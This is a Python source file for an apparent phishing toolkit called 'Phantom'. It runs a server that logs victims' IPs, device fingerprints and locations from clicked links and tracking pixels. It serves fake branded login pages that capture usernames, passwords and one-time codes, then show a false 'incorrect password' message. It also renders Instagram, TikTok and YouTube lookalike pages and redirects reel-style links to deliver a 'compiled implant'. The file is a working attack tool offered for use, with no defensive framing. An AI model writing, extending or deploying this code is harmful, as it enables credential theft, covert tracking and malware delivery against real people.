"""
tracker.py — self-hosted tracking / credential-harvest server.

A real IP grabber needs a server the victim's browser connects to. Instead
of a fake placeholder URL, Phantom ships its own tiny HTTP server: the
operator exposes one port (directly or through a tunnel) and every phish
link is a route on that server.

Routes:

    GET  /<code>          click capture: logs IP + UA + referrer, 302 to decoy
    GET  /px/<code>       open tracking: 1x1 GIF + logs the open
    GET  /l/<code>        credential-harvest page (fake login form)
    POST /c/<code>        credential capture (username/password/otp)

    PHANTOM_TRACK_URL       public base URL used to build victim links
    PHANTOM_TRACK_HOST      bind host (default 0.0.0.0)
    PHANTOM_TRACK_PORT      bind port (default 8080)
    PHANTOM_TRACK_REDIRECT  where the victim lands after the click
    PHANTOM_TRACK_BRAND     brand shown on the fake login page
    PHANTOM_TRACK_OTP       "1" to add an OTP/2FA field to the login page
    PHANTOM_GEOIP_DB        optional MaxMind .mmdb for geo on captured IPs
    PHANTOM_TRACK_SKIN      video-lure skin: instagram | tiktok | youtube
    PHANTOM_TRACK_VIDEO_ID  YouTube video id embedded in the lure player

Everything is in-process and offline-safe: no third-party service, no API
key. The unit tests never bind a socket (they inject creator/fetcher or
drive the handler directly).
"""

from __future__ import annotations

import os
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional, Tuple

# 1x1 transparent GIF
_PIXEL_GIF = (
    b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
    b"\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00"
    b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
)


@dataclass
class VictimHit:
    """A captured click: the victim's source IP and fingerprint."""
    ip: str
    user_agent: str = ""
    time: str = ""
    referrer: str = ""
    os: str = ""
    device: str = ""
    browser: str = ""
    geo: str = ""


@dataclass
class OpenEvent:
    """An email open: the pixel was loaded."""
    ip: str
    user_agent: str = ""
    time: str = ""


@dataclass
class CredCapture:
    """Credentials submitted through a fake login page."""
    ip: str
    username: str
    password: str
    otp: str = ""
    user_agent: str = ""
    time: str = ""


# ---------------------------------------------------------------------------
# UA fingerprinting (dependency-free)
# ---------------------------------------------------------------------------

def fingerprint_ua(ua: str) -> Dict[str, str]:
    """Best-effort OS / device / browser from a User-Agent string."""
    ua = ua or ""
    low = ua.lower()
    out = {"os": "", "device": "", "browser": ""}
    if "windows" in low:
        out["os"] = "windows"
        if "phone" in low:
            out["device"] = "phone"
    elif "android" in low:
        out["os"] = "android"
        out["device"] = "phone" if "mobile" in low else "tablet"
    elif "iphone" in low or "ipad" in low or "ios" in low:
        out["os"] = "ios"
        out["device"] = "phone" if "iphone" in low else "tablet"
    elif "mac os" in low or "macintosh" in low:
        out["os"] = "macos"
    elif "linux" in low:
        out["os"] = "linux"
    elif "cros" in low:
        out["os"] = "chromeos"
    for key, name in (("edg/", "edge"), ("chrome/", "chrome"),
                      ("firefox/", "firefox"), ("safari/", "safari")):
        if key in low:
            out["browser"] = name
            break
    return out


# ---------------------------------------------------------------------------
# geo (optional MaxMind)
# ---------------------------------------------------------------------------

_GEO_CACHE: Dict[str, str] = {}


def geo_lookup(ip: str) -> str:
    """Country/city for an IP.

    Sources, in order:
      1. MaxMind DB   — PHANTOM_GEOIP_DB=<GeoLite2-City.mmdb> (offline, free)
      2. Online API   — PHANTOM_GEO_ONLINE=1  (ip-api.com, no key; the
                        request is made lazily at read time, never while
                        the victim's page loads, so the lure is not slowed
                        and nothing about the target leaks to the geo API)
    Private IPs always return "" (no meaningful location).
    """
    if not ip or ip.startswith(("10.", "192.168.", "127.", "172.")):
        return ""
    if ip in _GEO_CACHE:
        return _GEO_CACHE[ip]
    label = ""
    db_path = os.getenv("PHANTOM_GEOIP_DB", "").strip()
    if db_path and os.path.exists(db_path):
        try:
            import geoip2.database
            with geoip2.database.Reader(db_path) as reader:
                resp = reader.city(ip)
                city = resp.city.name or ""
                country = resp.country.iso_code or ""
                label = ", ".join(x for x in (city, country) if x)
        except Exception:
            label = ""
    if not label and os.getenv("PHANTOM_GEO_ONLINE", "0") not in ("0", "", "false"):
        try:
            import json as _json
            import urllib.request as _urlreq
            with _urlreq.urlopen(f"http://ip-api.com/json/{ip}", timeout=4) as r:
                data = _json.loads(r.read().decode("utf-8", "replace"))
            if data.get("status") == "success":
                label = ", ".join(x for x in
                                   (data.get("city", ""), data.get("countryCode", ""))
                                   if x)
        except Exception:
            label = ""
    _GEO_CACHE[ip] = label
    return label


# ---------------------------------------------------------------------------
# store
# ---------------------------------------------------------------------------

class HitStore:
    """Thread-safe in-memory ledger of clicks, opens and captured creds."""

    def __init__(self) -> None:
        self._hits: Dict[str, List[VictimHit]] = {}
        self._opens: Dict[str, List[OpenEvent]] = {}
        self._creds: Dict[str, List[CredCapture]] = {}
        self._lock = threading.Lock()

    def _now(self) -> str:
        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    def record(self, code: str, ip: str, user_agent: str,
               referrer: str = "") -> VictimHit:
        fp = fingerprint_ua(user_agent)
        hit = VictimHit(ip=ip, user_agent=user_agent, time=self._now(),
                        referrer=referrer, geo=geo_lookup(ip), **fp)
        with self._lock:
            self._hits.setdefault(code, []).append(hit)
        return hit

    def record_open(self, code: str, ip: str, user_agent: str) -> OpenEvent:
        ev = OpenEvent(ip=ip, user_agent=user_agent, time=self._now())
        with self._lock:
            self._opens.setdefault(code, []).append(ev)
        return ev

    def record_cred(self, code: str, ip: str, user_agent: str,
                    username: str, password: str, otp: str = "") -> CredCapture:
        cap = CredCapture(ip=ip, username=username, password=password,
                          otp=otp, user_agent=user_agent, time=self._now())
        with self._lock:
            self._creds.setdefault(code, []).append(cap)
        return cap

    def hits(self, code: str) -> List[VictimHit]:
        with self._lock:
            return list(self._hits.get(code, []))

    def opens(self, code: str) -> List[OpenEvent]:
        with self._lock:
            return list(self._opens.get(code, []))

    def creds(self, code: str) -> List[CredCapture]:
        with self._lock:
            return list(self._creds.get(code, []))


# ---------------------------------------------------------------------------
# login page
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# video lure page (looks like a reel/short, plays a real video)
# ---------------------------------------------------------------------------

_DEFAULT_VIDEO_ID = "jNQXAC9IVRw"  # "Me at the zoo" — harmless public video


def _video_page(skin: str, video_id: str, code: str, title: str = "",
                channel: str = "") -> str:
    """A mobile-style page that looks exactly like a social video (IG Reels,
    TikTok, YouTube Shorts) and actually plays a REAL embedded video. The
    page load IS the click: the tracker records the victim's IP on GET.
    `title`/`channel` are the real video's display metadata.
    """
    skin = (skin or "youtube").lower()
    if skin not in ("instagram", "tiktok", "youtube"):
        skin = "youtube"
    vid = video_id or ""
    title = title or "Video"
    channel = channel or "@creator"
    if vid:
        embed = (f'<iframe src="https://www.youtube.com/embed/{vid}'
                 f'?autoplay=1&mute=1&playsinline=1" '
                 f'style="width:100%;height:100%;border:0" '
                 f'allow="autoplay; encrypted-media" allowfullscreen></iframe>')
        watch = f"https://www.youtube.com/watch?v={vid}"
    else:
        embed = ('<div style="width:100%;height:100%;display:flex;align-items:center;'
                 'justify-content:center;background:#000;color:#fff;font-size:64px">'
                 '&#9654;</div>')
        watch = "#"

    if skin == "instagram":
        head = ('<div style="display:flex;align-items:center;padding:10px 14px;'
                'background:#fff"><span style="font-size:22px;font-weight:700;'
                'font-family:Georgia,serif;font-style:italic">Instagram</span>'
                '<span style="margin-left:auto;color:#8e8e8e">Reels</span></div>')
        wrap = ('<div style="margin:10px auto;width:min(420px,92vw);height:70vh;'
                'background:#000;border-radius:14px;overflow:hidden;position:relative;'
                'box-shadow:0 0 0 2px #fff, 0 0 0 5px #e1306c">' + embed + '</div>')
        caption = (f'<div style="text-align:center;margin:14px auto;max-width:420px;'
                   f'color:#262626"><b>{channel}</b> {title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#385898;font-weight:600;text-decoration:none">'
               f'Open in Instagram</a></div>')
    elif skin == "tiktok":
        head = (f'<div style="display:flex;align-items:center;padding:12px 14px;'
                f'background:#121212;color:#fff"><span style="font-size:20px;'
                f'font-weight:800">TikTok</span><span style="margin-left:8px;'
                f'font-size:11px;opacity:.6">{channel}</span></div>')
        wrap = ('<div style="margin:6px auto;width:min(340px,86vw);height:68vh;'
                'background:#000;border-radius:10px;overflow:hidden;position:relative">'
                + embed + '</div>')
        caption = (f'<div style="text-align:center;color:#aaa;margin-top:10px;'
                   f'font-size:13px">{title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#25f4ee;font-weight:600;text-decoration:none">'
               f'Watch on TikTok</a></div>')
    else:  # youtube
        head = ('<div style="display:flex;align-items:center;padding:10px 14px;'
                'background:#fff"><span style="color:#ff0000;font-size:24px;'
                'font-weight:700">&#9654;</span><span style="font-size:20px;'
                'font-weight:700;margin-left:4px">YouTube</span>'
                '<span style="margin-left:auto;color:#065fd4;font-weight:600;'
                'font-size:13px">Shorts</span></div>')
        wrap = ('<div style="margin:10px auto;width:min(400px,92vw);height:62vh;'
                'background:#000;border-radius:10px;overflow:hidden;position:relative;'
                'box-shadow:0 0 0 1px #e5e5e5">' + embed + '</div>')
        caption = (f'<div style="text-align:center;margin:12px auto;max-width:400px;'
                   f'color:#0f0f0f"><b>{channel}</b> {title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#065fd4;font-weight:600;text-decoration:none">'
               f'Watch on YouTube</a></div>')
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        f'<title>Video</title></head>'
        f'<body style="margin:0;font-family:Arial,sans-serif;background:#fafafa">'
        f'{head}{wrap}{caption}{cta}'
        '<div style="text-align:center;color:#999;font-size:11px;margin:14px 0 20px">'
        'Content is loading — check your connection and try again if needed.</div>'
        '</body></html>')


def _login_page(brand: str, otp: bool) -> str:
    otp_field = (
        '<div style="margin-bottom:14px"><label>One-time code</label><br>'
        '<input type="text" name="otp" autocomplete="one-time-code" '
        'style="width:100%;padding:8px;box-sizing:border-box"></div>'
        if otp else "")
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>{brand}</title></head>
<body style="font-family:Arial,sans-serif;background:#f2f2f2;margin:0">
<div style="max-width:380px;margin:60px auto;background:#fff;padding:32px;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.2)">
<div style="font-size:22px;font-weight:bold;margin-bottom:6px">{brand}</div>
<div style="color:#555;margin-bottom:18px">Sign in to continue</div>
<form method="post" action="/c/__CODE__">
<label>Email or username</label><br>
<input type="text" name="username" autocomplete="username" style="width:100%;padding:8px;margin:4px 0 14px;box-sizing:border-box"><br>
<label>Password</label><br>
<input type="password" name="password" autocomplete="current-password" style="width:100%;padding:8px;margin:4px 0 14px;box-sizing:border-box"><br>
{otp_field}
<button type="submit" style="width:100%;background:#0a5bd3;color:#fff;border:0;padding:10px;border-radius:4px;font-size:15px">Sign in</button>
</form>
<div style="color:#888;font-size:12px;margin-top:18px">Protected by {brand} security.</div>
</div></body></html>"""


# ---------------------------------------------------------------------------
# server
# ---------------------------------------------------------------------------

class TrackingServer:
    """Minimal HTTP server for click/open capture and credential harvest."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 redirect_url: str = "https://example.com",
                 brand: str = "Account verification", otp: bool = False,
                 skin: str = "youtube", video_id: str = "",
                 store: Optional[HitStore] = None) -> None:
        self.host = host
        self.port = port
        self.redirect_url = redirect_url
        self.brand = brand
        self.otp = otp
        self.skin = skin
        self.video_id = video_id or os.getenv("PHANTOM_TRACK_VIDEO_ID", "")
        self.store = store or HitStore()
        # per-code real-video metadata: code -> {id, title, channel}
        self._videos: Dict[str, Dict[str, str]] = {}
        # per-code silent redirect target: code -> url (camouflaged beacon)
        self._redirects: Dict[str, str] = {}
        # per-code hosted asset (operator-chosen image): code -> (bytes, ctype)
        self._images: Dict[str, bytes] = {}
        self._image_types: Dict[str, str] = {}
        self._httpd: Optional[ThreadingHTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self.running = False
        self.bind_error: Optional[str] = None

    def register_video(self, code: str, meta: Dict[str, str]) -> None:
        """Attach a real video {id, title, channel} to a tracking code so
        the lure page renders that specific video."""
        if code and meta.get("id"):
            self._videos[code] = dict(meta)

    def register_redirect(self, code: str, target_url: str) -> None:
        """Point a tracking code at a silent 302 target. Used to camouflage
        beacon delivery: the victim opens what looks like a reel/share link
        and the redirect serves the compiled implant."""
        if code and target_url:
            self._redirects[code] = target_url

    def register_image(self, code: str, data: bytes, ctype: str = "image/jpeg") -> None:
        """Host an operator-chosen image under /i/<code>: whoever LOADS it
        (browser, or an <img src> in an email/page) fires the tracker — IP,
        device fingerprint and geo captured with zero interaction."""
        if code and data:
            self._images[code] = data
            self._image_types[code] = ctype

    def _make_handler(self):
        store = self.store
        redirect_url = self.redirect_url
        brand = self.brand
        otp = self.otp
        skin = self.skin
        video_id = self.video_id
        videos = self._videos
        redirects = self._redirects
        images = self._images
        image_types = self._image_types
        login_page = _login_page(brand, otp)

        def video_page(code: str) -> str:
            meta = videos.get(code) or {}
            return _video_page(skin,
                               meta.get("id") or video_id, code,
                               title=meta.get("title", ""),
                               channel=meta.get("channel", ""))

        class _Handler(BaseHTTPRequestHandler):
            # -- helpers --------------------------------------------------

            def _code(self) -> str:
                path = self.path.split("?")[0].strip("/")
                parts = path.split("/")
                return parts[-1] if parts else ""

            def _send(self, status: int, body: bytes, ctype: str) -> None:
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                try:
                    self.wfile.write(body)
                except OSError:
                    pass

            def _send_redirect(self, location: str, status: int = 302) -> None:
                self.send_response(status)
                self.send_header("Location", location)
                self.send_header("Content-Length", "0")
                self.end_headers()

            # -- routes ---------------------------------------------------

            def do_GET(self):  # noqa: N802
                path = self.path.split("?")[0].strip("/")
                code = self._code()
                ip = self.client_address[0]
                ua = self.headers.get("User-Agent", "")
                if path.startswith("px/"):
                    if code:
                        store.record_open(code, ip, ua)
                    self._send(200, _PIXEL_GIF, "image/gif")
                    return
                if path.startswith("i/"):
                    # operator-chosen image lure: loading the image IS the hit
                    if code and code in images:
                        store.record(code, ip, ua,
                                     self.headers.get("Referer", ""))
                        self._send(200, images[code],
                                   image_types.get(code, "image/jpeg"))
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if path.startswith("l/"):
                    if code:
                        page = login_page.replace("__CODE__", code)
                        self._send(200, page.encode("utf-8"),
                                   "text/html; charset=utf-8")
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if path.startswith("v/"):
                    if code:
                        referrer = self.headers.get("Referer", "")
                        store.record(code, ip, ua, referrer)
                        page = video_page(code)
                        self._send(200, page.encode("utf-8"),
                                   "text/html; charset=utf-8")
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                # share-format video links: /reel/<code> (Instagram),
                # /shorts/<code> (YouTube), /@user/video/<code> and
                # /video/<code> (TikTok), /p/<code> (Instagram post).
                # These look like real shared-video URLs; the code is the
                # last path segment and there is no traceable profile id.
                if (path.startswith(("reel/", "shorts/", "video/", "@", "p/"))
                        and code):
                    referrer = self.headers.get("Referer", "")
                    if code in redirects:
                        # camouflaged beacon: a reel-looking URL that hands
                        # the compiled implant to the visitor
                        store.record(code, ip, ua, referrer)
                        self._send_redirect(redirects[code])
                        return
                    store.record(code, ip, ua, referrer)
                    page = video_page(code)
                    self._send(200, page.encode("utf-8"),
                               "text/html; charset=utf-8")
                    return
                if code and code in redirects:
                    # camouflaged delivery: e.g. a reel-looking link that
                    # silently hands the compiled beacon to the visitor
                    store.record(code, ip, ua,
                                 self.headers.get("Referer", ""))
                    self._send_redirect(redirects[code])
                    return
                if code:
                    referrer = self.headers.get("Referer", "")
                    store.record(code, ip, ua, referrer)
                self._send_redirect(redirect_url)

            def do_POST(self):  # noqa: N802
                path = self.path.split("?")[0].strip("/")
                code = self._code()
                if not path.startswith("c/") or not code:
                    self._send(404, b"not found", "text/plain")
                    return
                length = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(length).decode("utf-8", "replace")
                form = urllib.parse.parse_qs(raw)
                store.record_cred(
                    code, self.client_address[0],
                    self.headers.get("User-Agent", ""),
                    (form.get("username") or [""])[0],
                    (form.get("password") or [""])[0],
                    (form.get("otp") or [""])[0])
                # never confirm success: bounce to "invalid credentials"
                page = (
                    f"<!DOCTYPE html><html><body style=\"font-family:Arial;"
                    f"margin:60px auto;max-width:360px;text-align:center\">"
                    f"<h2>Sign in</h2><p style=\"color:#c00\">The username or "
                    f"password you entered isn't correct.</p>"
                    f"<p><a href=\"/l/{code}\">Try again</a></p></body></html>")
                self._send(401, page.encode("utf-8"), "text/html; charset=utf-8")

            def log_message(self, *args, **kwargs):  # silence noisy logs
                pass

        return _Handler

    def start(self) -> "TrackingServer":
        """Bind and serve in a background thread. Idempotent and best-effort:
        a bind failure (port in use / excluded / no permission) is recorded
        on `bind_error` rather than raised."""
        if self._httpd is not None or self.running:
            return self
        try:
            self._httpd = ThreadingHTTPServer((self.host, self.port),
                                              self._make_handler())
        except OSError as e:
            self.bind_error = str(e)
            self.running = False
            return self
        self._thread = threading.Thread(target=self._httpd.serve_forever,
                                        daemon=True)
        self._thread.start()
        self.running = True
        return self

    def stop(self) -> None:
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd.server_close()
            self._httpd = None
            self._thread = None
            self.running = False
            self.bind_error = None


def env_tracker() -> TrackingServer:
    """Build a TrackingServer from PHANTOM_TRACK_* environment variables."""
    host = os.getenv("PHANTOM_TRACK_HOST", "0.0.0.0")
    try:
        port = int(os.getenv("PHANTOM_TRACK_PORT", "8080"))
    except ValueError:
        port = 8080
    redirect = os.getenv("PHANTOM_TRACK_REDIRECT", "https://example.com")
    brand = os.getenv("PHANTOM_TRACK_BRAND", "Account verification")
    otp = os.getenv("PHANTOM_TRACK_OTP", "0") not in ("0", "false", "no", "")
    skin = os.getenv("PHANTOM_TRACK_SKIN", "youtube").strip().lower()
    return TrackingServer(host=host, port=port, redirect_url=redirect,
                          brand=brand, otp=otp, skin=skin)


def public_base_url(host: str, port: int) -> str:
    """The URL victims will be sent to, or a clear hint if unconfigured."""
    configured = os.getenv("PHANTOM_TRACK_URL", "").strip()
    if configured:
        return configured.rstrip("/")
    if host in ("0.0.0.0", ""):
        host = "127.0.0.1"
    return f"http://{host}:{port}"
